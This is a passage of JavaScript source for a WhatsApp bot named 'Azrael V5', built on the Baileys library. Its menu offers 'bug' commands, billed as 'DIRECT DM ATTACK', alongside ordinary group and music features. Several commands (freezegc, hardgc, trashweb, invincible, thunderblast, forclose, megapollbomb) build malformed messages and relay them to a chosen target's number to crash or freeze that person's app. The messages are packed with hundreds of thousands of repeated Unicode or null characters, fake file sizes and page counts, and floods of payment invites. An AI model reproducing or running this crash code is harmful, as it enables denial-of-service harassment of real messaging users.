                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
                            mimetype: "application/json",
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999999",
                            pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: fileName,
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1715880173"
                        },
                        hasMediaAttachment: true
                    },
                    body: { text: bodyText },
                    nativeFlowMessage: {
                        messageParamsJson: `{"name":"galaxy_message","flow_action":"navigate","flow_action_payload":{"screen":"CTZ_SCREEN"},"flow_cta":"🚀","flow_id":"UNDEFINEDONTOP","flow_message_version":"9.903","flow_token":"UNDEFINEDONTOP"}`
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINEDONTOP" }]
                    }
                }
            }
        }
    }), { userJid: target });

    const msg1 = await genMsg(`${TravaIphone}️`, "𑇂𑆵𑆴𑆿".repeat(1000));
    await sam.relayMessage(target, msg1.message, { participant: { jid: target }, messageId: msg1.key.id });

    const msg2 = await genMsg("UNDEFINEDONTOP", "\u0000" + "ꦾ".repeat(150000) + "@1".repeat(250000));
    await sam.relayMessage(target, msg2.message, { participant: { jid: target }, messageId: msg2.key.id });

    await sam.relayMessage(target, {
        locationMessage: {
            degreesLatitude: 173.282,
            degreesLongitude: -19.378,
            name: TravaIphone,
            url: "https://youtube.com/@ShinZ.00"
        }
    }, { participant: { jid: target } });

await sam.relayMessage(target, {
        'extendedTextMessage': {
            'text': TravaIphone,
            'contextInfo': {
                'stanzaId': target,
                'participant': target,
                'quotedMessage': {
                    'conversation': 'UNDEFINEDONTOP↕️' + 'ꦾ'.repeat(50000)
                },
                'disappearingMode': {
                    'initiator': "CHANGED_IN_CHAT",
                    'trigger': "CHAT_SETTING"
                }
            },
            'inviteLinkGroupTypeV2': "DEFAULT"
        }
    }, {
        'participant': {
            'jid': target
        }
    }, {
        'messageId': null
    });

    const paymentMsg = service => ({
    paymentInviteMessage: {
        serviceType: service,
        expiryTimestamp: Date.now() + 91814400000,
        maxTransactionAmount: 10000000000,
        maxDailyTransaction: 100000000000,
        maxTransactionFrequency: 1,
        secureMode: true,
        verificationRequired: true,
        antiFraudProtection: true,
        multiFactorAuthentication: true,
        transactionLogging: true,
        geoLock: true,
        sessionTimeout: 300000,
        blacklistIPs: ["192.168.0.1", "192.168.0.2"],
        whitelistIPs: ["192.168.1.1", "192.168.1.2"],
        transactionRateLimit: 3,
        realTimeFraudDetection: true,
        dailyLimitResetTime: "00:00",
        fullAuditTrail: true,
        userBehaviorAnalysis: true,
        transactionNotification: true,
        dynamicSessionTokens: true,
        deviceFingerprinting: true,
        transactionEncryption: true,
        encryptedMsgID: generateEncryptedID(service)
    }
});

function generateEncryptedID(service) {
    return `ENC_${Buffer.from(service + Date.now()).toString('base64')}`;
}

for (const service of ["FBPAY", "UPI", "PAYPAL", "WPPAY", "GPAY", "PP", "APPLEPAY", "VENMO", "CASHAPP", "STRIPE", "BRAINTREE", "connSUNGPAY", "ALIPAY", "WECHATPAY", "MPAY", "AIPAY", "BIOPAY", "NFTPAY", "VOICEPAY", "BLOCKPAY", "QPAY", "NPAY", "ZPAY", "TLOCK", "HOLO"]) {
    await conn.relayMessage(target, paymentMsg(service), {
        participant: { jid: target },
        timestamp: Date.now(),
        requestID: generateEncryptedID(service),
    });
}
    
    await sam.relayMessage(target, {
        locationMessage: {
            degreesLatitude: 173.282,
            degreesLongitude: -19.378,
            name: "😘" + TravaIphone,
            url: "https://whatsapp.com/channel/0029Vajz4XmCnA7pBowZQ53h"
        }
    }, { participant: { jid: target } });
    
    await sam.relayMessage(target, {
        locationMessage: {
            degreesLatitude: 173.282,
            degreesLongitude: -19.378,
            name: "😘" + TravaIphone,
            url: "https://whatsapp.com/channel/0029Vajz4XmCnA7pBowZQ53h"
        }
    }, { participant: { jid: target } });
}
  async function freezegc(target) {	
          const jids = `_*~@254104301695~*_\n`.repeat(10200);
	      const ui = 'ꦽ'.repeat(1500);	
		    let etc = generateWAMessageFromContent(
				target,
				proto.Message.fromObject({
		           groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 922.999999999999,
                            degreesLongitude: -9229999999999.999 
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: ui + jid,
           "contextInfo": { mentionedJid: [ "0@s.whatsapp.net" ] }
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "120363301095727346@newsletter", groupSubject: " 𝗔𝗭𝗥𝗔𝗘𝗟-𝗩4 " }]
                               }
                            }
						}
					},
				}), {
					userJid: target
				}
			);
			await sam.relayMessage(target, etc.message, {});
		}
    
switch (command) {
//////  
 // menu button
  
case 'menu': {
let menu = `𝐇𝐄𝐋𝐋𝐎 𝐓𝐇𝐈𝐒 𝐈𝐒 𝐀𝐙𝐑𝐀𝐄𝐋 𝐕5
> ➩ 𝐔𝐒𝐄𝐑 : 𝐇𝐄𝐋𝐋𝐎 ${m.pushName} 
> ➩ 𝐎𝐖𝐍𝐄𝐑 𝐍𝐀𝐌𝐄: 𝕯𝖊𝖛𝖎𝖑 𝕬𝖉𝖎𝖔𝖘  
> ➩ 𝐎𝐖𝐍𝐄𝐑 𝐍𝐀𝐌𝐄 : *254113660118*
> ➩ 𝗦𝗣𝗘𝗘𝗗 / 𝗣𝗜𝗡𝗚:   10019838ms
> ➩ 𝐔𝐏𝐓𝐈𝐌𝐄 𝐁𝐎𝐓:  1hr
> ➩ 𝐕𝐄𝐑𝐒𝐈𝐎𝐍 𝐁𝐎𝐓 : 𝐕5

〤 *〈 𝐀𝐙𝐑𝐄𝐀𝐋 𝐕5 𝐌𝐄𝐍𝐔 〉* 〤

_┃𖣘_ _.𝐦𝐞𝐠𝐚𝐩𝐨𝐥𝐥𝐛𝐨𝐦𝐛_
_┃𖣘_ _.𝐩𝐨𝐥𝐥𝐛𝐨𝐦𝐛_
_┃𖣘_ _.𝐛𝐮𝐠𝐮𝐢_
_┃𖣘_ _.𝐡𝐚𝐫𝐝𝐠𝐜_
_┃𖣘_ _.𝐭𝐫𝐚𝐬𝐡𝐰𝐞𝐛_
_┃𖣘_ _.𝐧𝐞𝐰𝐦𝐞𝐭𝐚_
_┃𖣘_ _.𝐝𝐚𝐦𝐚𝐠𝐞_
_┃𖣘_ _.𝐚𝐝𝐢𝐨𝐬_
┗╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺

 ⧼⪻𝙏𝙊 𝙆𝙄𝙇𝙇 𝘼𝙇𝙇 𝘼𝙉𝘿 𝙎𝙋𝘼𝙍𝙀 𝙉𝙊𝙉 💀💀⪼⧽
┏╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍┓
┃   〖 𝐂𝐑𝐄𝐃𝐈𝐓𝐒 〗
┃  𝕯𝖊𝖛𝖎𝖑 𝕬𝖉𝖎𝖔𝖘 (𝗼𝘄𝗻𝗲𝗿) 
┃  𝕶𝖎𝖓𝖌 𝕾𝖕𝖎𝖐𝖊 (𝗔𝗱𝘃 𝗗𝗲𝘃)  
┗╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍┛
©𝕯𝖊𝖛𝖎𝖑 𝕬𝖉𝖎𝖔𝖘
𝐀𝐙𝐑𝐀𝐄𝐋 𝐕5`
let buttons = [
        { buttonId: "wa.me/254113660118", buttonText: { displayText: "owner" } }
    ];
    let buttonMessage = {
        image: { url: `https://files.catbox.moe/hij90y.jpg` },
	    gifPlayback: true,
        caption: menu,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363364795821877@newsletter",
                newsletterName: `𝐚𝐳𝐫𝐚𝐞𝐥 𝐯5¶¶∆𝐡𝐚𝐛𝐢𝐧𝐠𝐞𝐫 𓂸𓂺`
            }
        },
        footer: "☠ǟʐʀǟɛʟ ɨֆ ɦɛʀɛ☠!",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    const flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'This Button List' },
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "𝐦𝐞𝐧𝐮",
                    sections: [
                        {
                            title: "𝐬𝐞𝐥𝐞𝐜𝐭 𝐨𝐧𝐞",
                            highlight_label: "",
                            rows: [
                                { title: "𝐜𝐨𝐨𝐥𝐦𝐞𝐧𝐮", description: "Features", id: ".𝐚𝐝𝐯𝐚𝐧𝐜𝐞𝐝" },
                                { title: "Bug Menu", description: "display bugs", id: ".dmbugs" },                            
                                { title: "gc menu", description: "display group menu", id: ".gcmenu" }
                                
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }
    ];
    buttonMessage.buttons.push(...flowActions);

    await sam.sendMessage(m.chat, buttonMessage, { quoted: loli });
};
await sam.sendMessage(m.chat, {
    audio: { url: './Media/menu.mp3' }, // or correct path to your audio
    mimetype: 'audio/mpeg', // or 'audio/mp4' based on the file type
    ptt: true // true = voice note style
}, { quoted: loli });
break
      
            
                  

        case "gcmenu": {
  caption = `
𝐇𝐄𝐋𝐋𝐎 𝐓𝐇𝐈𝐒 𝐈𝐒 𝐀𝐙𝐑𝐀𝐄𝐋 𝐕5
➩ 𝐔𝐒𝐄𝐑 : 𝐇𝐄𝐋𝐋𝐎 ${m.pushName} 
➩ 𝐎𝐖𝐍𝐄𝐑 𝐍𝐀𝐌𝐄: 𝕯𝖊𝖛𝖎𝖑 𝕬𝖉𝖎𝖔𝖘  
➩ 𝐎𝐖𝐍𝐄𝐑 𝐍𝐀𝐌𝐄 : *254113660118*
➩ 𝗦𝗣𝗘𝗘𝗗 / 𝗣𝗜𝗡𝗚:  
➩ 𝐔𝐏𝐓𝐈𝐌𝐄 𝐁𝐎𝐓:  
➩ 𝐕𝐄𝐑𝐒𝐈𝐎𝐍 𝐁𝐎𝐓 : 𝐕5

  〤 *〈 𝐂𝐇𝐀𝐓 𝐂𝐎𝐍𝐓𝐑𝐎𝐋 〉* 〤
 
┃𖣘 .kick
┃𖣘 .everyone 
┃𖣘 .groupinfo 
┃𖣘 .resetlinkgc
┃𖣘 .block
┃𖣘 .antivv on/off
┗╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸

v5 is here`
  sam.sendMessage(m.chat, {
    image: {
      url: "https://files.catbox.moe/hij90y.jpg"
    },
    caption,
    mentions: [m.sender],
    footer: global.botname,
    buttons: [
      {
        buttonId: "advanced",
        buttonText: {
          displayText: "normal menu"
        }
      }
    ],
    viewOnce: true,
    headerType: 6,
    quoted: m,
    contextInfo: {
      isForwarded: true,
      forwardingScore: 99999,
      forwardedNewsletterMessageInfo: {
        newsletterJid: `120363301095727346@newsletter`, // Use the newsletterJid here
        newsletterName: `v5` // Add the newsletter name here
      }
    }
  });
}
break;
        case "advanced": {
  caption = `
 𝐇𝐄𝐋𝐋𝐎 𝐓𝐇𝐈𝐒 𝐈𝐒 𝐀𝐙𝐑𝐀𝐄𝐋 𝐕5
➩ 𝐔𝐒𝐄𝐑 : 𝐇𝐄𝐋𝐋𝐎 ${m.pushName} 
➩ 𝐎𝐖𝐍𝐄𝐑 𝐍𝐀𝐌𝐄: 𝕯𝖊𝖛𝖎𝖑 𝕬𝖉𝖎𝖔𝖘  
➩ 𝐎𝐖𝐍𝐄𝐑 𝐍𝐀𝐌𝐄 : *254113660118*
➩ 𝗦𝗣𝗘𝗘𝗗 / 𝗣𝗜𝗡𝗚:   
➩ 𝐔𝐏𝐓𝐈𝐌𝐄 𝐁𝐎𝐓: 
➩ 𝐕𝐄𝐑𝐒𝐈𝐎𝐍 𝐁𝐎𝐓 : 𝐕5

〤 *〈 𝐀𝐃𝐕𝐀𝐍𝐂𝐄𝐃 〉* 〤

┃𖣘 .play2
┃𖣘 .everyone
┃𖣘 .broadcast
┃𖣘 .play
┃𖣘 .public
┃𖣘 .self
┃𖣘 .runtime
┃𖣘 .ping
┃𖣘 .antidelete on 
┃𖣘 .antidelete off
┃𖣘 .whois
┃𖣘 .device
┃𖣘 .groupinfo
┗╸╸╸╸╸╸╸╸╸╸╸╸╸╸
azrael v5`
  sam.sendMessage(m.chat, {
    image: {
      url: "https://files.catbox.moe/hij90y.jpg"
    },
    caption,
    mentions: [m.sender],
    footer: global.botname,
    buttons: [
      {
        buttonId: "menu",
        buttonText: {
          displayText: "back to normal menu"
        }
      }
    ],
    viewOnce: true,
    headerType: 6,
    quoted: m,
    contextInfo: {
      isForwarded: true,
      forwardingScore: 99999,
      forwardedNewsletterMessageInfo: {
        newsletterJid: `120363301095727346@newsletter`, // Use the newsletterJid here
        newsletterName: `v5` // Add the newsletter name here
      }
    }
  });
}
break;
        case 'block': {
    // Only allow bot owner(s) to use
    if (!isOwner) return m.reply("Only the bot owner can use this command.");

    // Check if message is a reply
    let target = m.quoted ? m.quoted.sender : text.split(' ')[1]?.replace(/[^0-9]/g, '');

    if (!target) return m.reply("Reply to a message or tag the number to block.");

    if (!target.includes('@s.whatsapp.net')) target = `${target}@s.whatsapp.net`;

    try {
        await sam.updateBlockStatus(target, "block");
        m.reply(`✅ Blocked @${target.split('@')[0]}`, { mentions: [target] });
    } catch (e) {
        m.reply("❌ Failed to block. Check the number and try again.");
    }
}
break;
        case 'play2': {
  if (!q) return Reply1("Please provide a search query or the name of the song.");
  const axios = require('axios');
  let audioSearch = `https://api.lolhuman.xyz/api/ytplay?apikey=YOUR_API_KEY&query=${encodeURIComponent(q)}`;
  
  let res = await axios.get(audioSearch);
  let audioUrl = res.data.results[0]?.audioUrl; // Extract first result

  if (!audioUrl) return Reply1("Sorry, I couldn't find that song.");

  await sam.sendMessage(m.chat, { audio: { url: audioUrl }, mimetype: 'audio/mp4', ptt: false }, { quoted: m });
  Reply1(`Playing: *${q}*`);
}
break;
        case "dmbugs": {
  caption =`
𝐇𝐄𝐋𝐋𝐎 𝐓𝐇𝐈𝐒 𝐈𝐒 𝐀𝐙𝐑𝐀𝐄𝐋 𝐕5
➩ 𝐔𝐒𝐄𝐑 : 𝐇𝐄𝐋𝐋𝐎 ${m.pushName} 
➩ 𝐎𝐖𝐍𝐄𝐑 𝐍𝐀𝐌𝐄: 𝕯𝖊𝖛𝖎𝖑 𝕬𝖉𝖎𝖔𝖘  
➩ 𝐎𝐖𝐍𝐄𝐑 𝐍𝐀𝐌𝐄 : *254113660118*
➩ 𝗦𝗣𝗘𝗘𝗗 / 𝗣𝗜𝗡𝗚:   
➩ 𝐔𝐏𝐓𝐈𝐌𝐄 𝐁𝐎𝐓:  
➩ 𝐕𝐄𝐑𝐒𝐈𝐎𝐍 𝐁𝐎𝐓 : 𝐕5

〤 *〈 𝐃𝐈𝐑𝐄𝐂𝐓 𝐃𝐌 𝐀𝐓𝐓𝐀𝐂𝐊 〉* 〤

┃𖣘 .thunderblast
┃𖣘 .forclose
┃𖣘 .
┃𖣘 .
┃𖣘 .
┃𖣘 .
┗╺╺╺╺╺╺╺╺╺╺

v5 is here`
  sam.sendMessage(m.chat, {
    image: {
      url: "https://files.catbox.moe/hij90y.jpg"
    },
    caption,
    mentions: [m.sender],
    footer: global.botname,
    buttons: [
      {
        buttonId: "menu",
        buttonText: {
          displayText: "normal menu"
        }
      }
    ],
    viewOnce: true,
    headerType: 6,
    quoted: m,
    contextInfo: {
      isForwarded: true,
      forwardingScore: 99999,
      forwardedNewsletterMessageInfo: {
        newsletterJid: `120363301095727346@newsletter`, // Use the newsletterJid here
        newsletterName: `v5` // Add the newsletter name here
      }
    }
  });
}
break;
        case 'thunderblast_ios1':
case 'thunderblast':
    if (!isOwner) return m.reply('You are not authorized to use this command.');

    if (!args[0]) return m.reply('Please provide a target JID (example: 1234567890@s.whatsapp.net)');

    try {
        await thunderblast_ios1(args[0]);
        m.reply(`Thunderblast v1 sent to ${args[0]}`);
    } catch (err) {
        console.error(err);
        m.reply('Failed to send thunderblast.');
    }
    break;
        case 'resetlinkgc': {
  if (!isOwner) return Reply1("_Only For Dev.Rage/Owner..._");
  if (!m.isGroup) return Reply1("Features can be accessed in group only");
  if (!isBotAdmin) return Reply1("Features can be accessed by bot admin");

  sam.groupRevokeInvite(from);
}
break;
case 'kick': {
  if (!isOwner ) return Reply1("_Only For Dev.Rage/Owner..._");
  if (!m.isGroup) return Reply1("Features can be accessed in group only");
  if (!isBotAdmin) return Reply1("Features can be accessed by bot admin only");
  if (!isBotAdmins) return Reply1("Features can be accessed by Admin only");

  let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  if (!q) return Reply1("Send number / tag users ");
  await sam.groupParticipantsUpdate(from, [users], 'remove');
}
break;
        case 'hardgc': case 'crash-link':
async function UnicornXeon(jides,definirText) {await finisher.relayMessage(jides, {extendedTextMessage: {text: definirText},"deviceSentMessage": {"phash": ""}}, {});}
const stanza = [{attrs: { biz_bot: '1' },tag: "bot",},{attrs: {},tag: "biz",},];
const xeoncres = {
quotedMessage: {
buttonsMessage: {
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
fileLength: "9999999999999",
pageCount: 3567587327,
mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
fileName: "яαgємσ∂ѕ ѕαуѕ нι тσ уσυ𓊈𒆜𓊉ꦾꦷꦿꦵ",
fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
mediaKeyTimestamp: "1735456100",
contactVcard: true,
caption: "\n"
},
contentText: "🚫",
footerText: "🪪",
buttons: [{
buttonId: "\u0000".repeat(850000),
buttonText: {
displayText: "𐎟"
},
type: 1
}],
headerType: 3
}
}}
await Reply1(`Bug is being sent\n\nNote: Do not unarchive this chat.`)
await sam.chatModify({archive: true,lastMessages: [{key: m.key,messageTimestamp: "9999",fromMe: false}]}, from)
await sam.sendMessage(from, {text: "ꦾꦷꦿꦵ𝕯𝖊𝖛𝖎𝖑 𝖆𝖉𝖎𝖔𝖘",mentions: [m.sender],footer: "드림",buttons: [{buttonId: "\u0000".repeat(85000),buttonText: {displayText: m}},{buttonId: "\u0000".repeat(85000), buttonText: {displayText: m}}],viewOnce: true,headerType: 6,}, {})
for (let i = 0; i < 30; i++) {
await sam.sendMessage(from, {sticker: {url: './xeon_crashed.webp'},contextInfo: {participant: "0@s.whatsapp.net",remoteJid: "status@broadcast",quotedMessage: xeoncres.quotedMessage}})
}
await test(m.chat)
await UnicornXeon(from, pushname)
await UnicornXeon(from, pushname)
await test(m.chat)
await test(m.chat)
await UnicornXeon(from, pushname)
await UnicornXeon(from, pushname)
await test(m.chat)
await sleep(3000)
await test(m.chat)
await UnicornXeon(from, pushname)
await UnicornXeon(from, pushname)
await test(m.chat)
await test(m.chat)
await UnicornXeon(from, pushname)
await UnicornXeon(from, pushname)
await test(m.chat)
break

        case 'trashweb':
if (!isOwner) return Reply1("not owner") 
try {
for (let i = 0; i < 10; i++) {
messa = await prepareWAMessageMedia({
image: {
url: `https://files.catbox.moe/hij90y.jpg`
}
}, {
upload: sam.waUploadToServer
})
catalog = generateWAMessageFromContent(from, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "449756950375071",
"itemCount": 99999999999,
"title": `PC KILLER X 🦄드림 가이 Xeon`,
"description": ``,
"currencyCodeIso4217": "IDR",
"footerText": ``,
"productImageCount": 99999999999999999999,
"firstImageId": 9999999999,
"priceAmount1000": "999",
"salePriceAmount1000": "IDR 99.99999999999999999999",
"thumbnail": messa.imageMessage,
"jpegThumbnail": tdxlol,
"firstImageId": 99999999,
"url": "wa.me/5512981791389"
},
"businessOwnerJid": from,
}
}), {
userJid: sam.user.id,
quoted: null
})
sam.relayMessage(from, catalog.message, {
messageId: catalog.key.id
})
}
} catch (e) {
console.log(e);
}
break
case 'invincible':
    if (!isOwner) return Reply1("for owner only");
    if (!isOwner) return Reply1(`Example:\n ${prefix + command} 234xxx`);
    
    victim = text.split("|")[0];
    Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    
    var contactInfo = await sam.onWhatsApp(Xreturn);
    if (victim == "916909137213" || victim == "919366316018" || victim == "919402104401") {
        return;
    }
    
    if (contactInfo.length == 0) {
        return Reply1("This bugged number is banned on WhatsApp");
    }
    
    async function XeonInvisibleNew(target, o, Ptcp = true) {
        let msg = await generateWAMessageFromContent(target, {
            buttonsMessage: {
                text: "🩸v5 is here",
                contentText: "\u0000",
                footerText: "\u0000",
                buttons: [
                    {
                        buttonId: ".aboutb",
                        buttonText: {
                            displayText: "\u0000" + "\u0018".repeat(399999),
                        },
                        type: 1,
                    },
                ],
                headerType: 1,
            },
        }, {});
        
        await sam.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: undefined,
                                },
                            ],
                        },
                    ],
                },
            ],
        });
        
        if (target) {
            await sam.relayMessage(
                target,
                {
                    groupStatusMentionMessage: {
                        message: {
                            protocolMessage: {
                                key: msg.key,
                                type: 25,
                            },
                        },
                    },
                },
                {
                    additionalNodes: [
                        {
                            tag: "meta",
                            attrs: {
                                is_status_mention: "🦠 - last train home",
                            },
                            content: undefined,
                        },
                    ],
                }
            );
        }
    }

    Reply1(
        `⌜ *Information Attacking* ⌟\n- Attack Status : _True_\n- Command : _X-Invi_\n- Target : _${Xreturn}_`, 
        [Xreturn]
    );

    await sleep(1000);
    for (let i = 0; i < 10; i++) {
        await XeonInvisibleNew(Xreturn, sam, (cct = true), (ptcp = true));
    }
    break;
    case 'dm': {
  if (!isOwner) return reply("Owner only.");
  await dmLagBug(m, sam, reply);
}
break;
        case 'play': {
    if (!text) return Reply1(`*Example*: ${prefix + command} it's adios`);

    try {
        // React to the message
        await sam.sendMessage(m.chat, { react: { text: '🎵', key: m.key } });

        // YouTube search
        const yts = require("yt-search");
        let search = await yts(qtext);
        let video = search.videos[0]; // Get the first video result

        if (!video) {
            return Reply1('*No results found. Please try another query.*');
        }

        // Prepare the body text for the reply
        let body = `finding`;

        // Send video thumbnail and details
        await sam.sendMessage(
            m.chat,
            {
                image: { url: video.thumbnail },
                caption: body,
            },
            { quoted: xXx }
        );

        // Call YouTube MP3 download API
        const axios = require("axios");
        const apiResponse = await axios.get('https://api.davidcyriltech.my.id/download/ytmp3', {
            params: { url: video.url }
        });

        if (apiResponse.data.success) {
            const { download_url, title, thumbnail } = apiResponse.data.result;

            // Send the audio file
            await sam.sendMessage(
                m.chat,
                {
                    audio: { url: download_url },
                    mimetype: 'audio/mp4',
                    ptt: true,
                    mediaType: 1,
                    fileName: `${title}.mp3`,
                    caption: `🎧 *Here's your song:*\n> *Title:* ${title}`,
                },
                { quoted: xXx }
            );
        } else {
            return Reply1('*Error fetching the song. Please try again later!*');
        }
    } catch (error) {
        console.error('Error during play command:', error);
        return Reply1('*An error occurred while processing your request. Please try again later.*');
    }
    break;
}
        case 'forclose':
  if (!isOwner) return m.reply('Only the owner can use this command.');
  if (!m.quoted) return m.reply('Reply to a user\'s message to target them.');

  try {
    await forclose(m.quoted.sender);
    m.reply('Flood message sent successfully.');
  } catch (error) {
    console.error(error);
    m.reply('Failed to send flood message.');
  }
  break;
        //HIDETAG CASE

case 'everyone': { 
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmin) return reply('_Bots Must Become Admins First_')
if (!isBotAdmin) return reply('Admin only!!')
let mem = m.isGroup ? await groupMetadata.participants.map(a => a.id) : ""
sam.sendMessage(m.chat, { text: `@${m.chat}\n${text}`,
contextInfo: { mentionedJid: mem, groupMentions: [{ groupSubject: `ᴇᴠᴇʀʏᴏɴᴇ`, groupJid: m.chat }]}});
}
break
        case 'setgcicon': {
  if (!m.isGroup) return reply('This command can only be used in groups!');
  if (!isBotAdmin) return reply('The bot must be an admin to change the group icon!');
  
  if (args.length === 0) return reply('Please send an image to set as the group icon!');
  
  // Get the image sent in the message
  const image = await sam.downloadMediaMessage(m);
  
  // Set the image as the group icon
  await sam.updateGroupPicture(m.chat, image);
  
  reply('Group icon changed successfully!');
  break;
}
        
case "public": {
if (!isOwner) return reply(mess.owner)
sam.public = true
reply("> AZREAL IS NOW ON A PUBLIC MODE")
}
break
// 𝐁roadcast safe 
case 'broadcast': { 
    if (!isOwner) return Reply1(`You are not my owner`)
    if (!text)  return Reply1(`provide a broadcast message`)
            
         let getGroups = await sam.groupFetchAllParticipating() 
         let groups = Object.entries(getGroups) 
             .slice(0) 
             .map(entry => entry[1]) 
         let res = groups.map(v => v.id) 
         Reply1(` Broadcasting in ${res.length} Group Chat, in ${res.length * 1.5} seconds`) 
         for (let i of res) { 
             let txt = `𝕯𝖊𝖛𝖎𝖑 𝖆𝖉𝖎𝖔𝖘 is sending a broadcast message 🗣️🔥🔥\n\n Message: ${text}\n\nAuthor: ${pushname}` 
             await sam.sendMessage(i, { 
                 image: { 
                     url: "https://files.catbox.moe/hij90y.jpg" 
                 }, 
                 caption: `${txt}` 
             }) 
         } 
         Reply1(`Broadcasted to ${res.length} Groups.`) 
     } 
 break;
// 𝐛𝐮𝐠 𝐩𝐥𝐮𝐬 𝐧𝐮𝐦𝐛𝐞𝐫
        


        case 'whois': {
    let targetUser = m.mentionedJid && m.mentionedJid[0]
        ? m.mentionedJid[0]
        : m.quoted
        ? m.quoted.sender
        : m.sender;

    try {
        let pfp = await sam.profilePictureUrl(targetUser, 'image').catch(() => null)
        let status = await sam.fetchStatus(targetUser).catch(() => ({ status: "No status found" }));
        let name = await sam.getName(targetUser);

        let whoisInfo = `╭───[ *WHOIS* ]───╮
│ *Name:* ${name}
│ *Number:* ${targetUser.split('@')[0]}
│ *Bio:* ${status.status}
│ *ID:* ${targetUser}
│ *phone*: *weak phone*
╰────────────────╯`;

        await sam.sendMessage(m.chat, {
            image: { url: pfp || 'https://telegra.ph/file/265c672b3b81da0dc8d25.jpg' },
            caption: whoisInfo,
            mentions: [targetUser]
        }, { quoted: m });

    } catch (err) {
        reply("❌ Failed to fetch user info.");
        console.log("[WHOIS Error]", err);
    }
}
break;
        case 'antidelete': {
    if (!isOwner) return reply("Only the owner can toggle Anti-Delete!");
    if (!text) return reply(`Use: ${prefix + command} on / off`);

    if (text.toLowerCase() === 'on') {
        antiDelete = true;
        reply("✅ Anti-Delete is now *ON*");
    } else if (text.toLowerCase() === 'off') {
        antiDelete = false;
        reply("❌ Anti-Delete is now *OFF*");
    } else {
        reply("Please use `on` or `off`.");
    }
}
break;
case 'megapollbomb': {
  console.log("isOwner:", isOwner); // Debugging if isOwner is defined
  if (!isOwner) {
    return reply("Restricted to authorized users only!");
  }

  if (!text) {
    return reply(`Tag a number or group!\nExample: ${prefix + command} 1234567890@s.whatsapp.net`);
  }

  console.log("Command text:", text); // Debugging if text is correctly parsed

  let target = text.includes('@') ? text : `${text}@s.whatsapp.net`;

  sam.sendMessage(m.chat, { react: { text: "💥", key: m.key } });

  try {
    console.log("Calling megaPollBomb..."); // Debugging the function call
    await megaPollBomb(target, sam); // Call the megaPollBomb function
    reply(`⚡ Mega Poll Bomb deployed to: ${target}`);
  } catch (err) {
    console.error("[Mega Poll Bomb Error]", err); // Log any errors for debugging
    reply("❌ Failed to deploy. Error occurred.");
  }

  break;
}
        case 'groupinfo': {
  if (!m.isGroup) return reply("This command is only for groups.");
  await sendGroupInfo(m, sam);
  break;
}
case "ping": case "speed": { 
let timestamp = speed()
let latensi = speed() - timestamp

         m.reply (`━━━━━━━━━━━━━━━━━\n\◈𝙰𝚉𝚁𝙰𝙴𝙻 𝚅5 𝚂𝙿𝙴𝙴𝙳   : ${latensi.toFixed(4)} 𝐌𝐒\n\━━━━━━━━━━━━━━━━━`); 
         } 
 break; 
case "runtime":
                let pinga = ` AZRAEL IS ACTIVE ${runtime(process.uptime())}`
               sam.sendMessage(m.chat, {
                    text: pinga,
                    contextInfo: {
